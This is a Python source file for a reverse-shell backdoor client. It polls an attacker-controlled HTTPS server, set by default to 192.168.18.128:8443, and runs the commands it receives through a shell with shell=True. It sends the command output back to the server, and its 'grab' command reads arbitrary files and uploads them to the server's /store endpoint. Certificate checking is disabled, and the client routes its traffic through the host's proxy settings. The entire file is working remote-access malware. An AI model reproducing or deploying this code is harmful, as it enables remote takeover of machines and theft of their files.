from urllib import request, parse
import subprocess
import time
import os
from http.client import RemoteDisconnected
import ssl
import platform

class Client:
    def __init__(self, attacker_ip='192.168.18.128', https_port=8443):
        self.attacker_ip = attacker_ip
        self.https_port = https_port
        self.proxy = self.get_proxy_settings()

    def get_proxy_settings(self):
        os_type = platform.system()
        proxy = None

        if os_type == "Windows":
            proxy = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')
        elif os_type in ["Linux", "Darwin"]:  # Darwin is macOS
            proxy = os.getenv('http_proxy') or os.getenv('https_proxy')
        
        return proxy

    def send_post(self, data, url, verify_ssl=False):   
        data = {"rfile": data}
        data = parse.urlencode(data).encode()
        req = request.Request(url, data=data)
        
        context = ssl.create_default_context()
        
        if not verify_ssl:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

        if self.proxy:
            proxy_handler = request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            opener = request.build_opener(proxy_handler)
            request.install_opener(opener)

        try:
            request.urlopen(req, context=context)
        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
            print(f"Error sending data: {e}")
            print("Connection closed, exiting...")
            exit(1)

    def send_file(self, command):
        try:
            grab, path = command.strip().split(' ')
        except ValueError:
            self.send_post("[-] Invalid grab command (maybe multiple spaces)", url=f'https://{self.attacker_ip}:{self.https_port}/store', verify_ssl=True)
            return

        if not os.path.exists(path):
            self.send_post("[-] Not able to find the file", url=f'https://{self.attacker_ip}:{self.https_port}/store', verify_ssl=True)
            return

        store_url = f'https://{self.attacker_ip}:{self.https_port}/store'
        with open(path, 'rb') as fp:
            try:
                self.send_post(fp.read(), url=store_url, verify_ssl=False)
            except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
                print(f"Error sending file: {e}")
                print("Connection closed, exiting...")
                exit(1)

    def run_command(self, command):
        CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        self.send_post(CMD.stdout.read(), url=f'https://{self.attacker_ip}:{self.https_port}', verify_ssl=False)
        self.send_post(CMD.stderr.read(), url=f'https://{self.attacker_ip}:{self.https_port}', verify_ssl=False)

    def connect_to_https_server(self, verify_ssl=False):
        context = ssl.create_default_context()
        
        if not verify_ssl:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

        if self.proxy:
            proxy_handler = request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            opener = request.build_opener(proxy_handler)
            request.install_opener(opener)

        try:
            command = request.urlopen(f"https://{self.attacker_ip}:{self.https_port}", context=context).read().decode()
            return command
        except (request.URLError, request.HTTPError, RemoteDisconnected) as e:
            print(f"Error connecting to HTTPS server: {e}")
            return None

    def start(self):
        while True:
            command = self.connect_to_https_server(verify_ssl=False)
            
            if command is None:
                print("HTTPS server is down, exiting...")
                exit(1)

            if 'terminate' in command:
                break

            if 'grab' in command:
                self.send_file(command)
                continue

            self.run_command(command)
            time.sleep(1)

if __name__ == "__main__":
    client = Client()
    client.start()
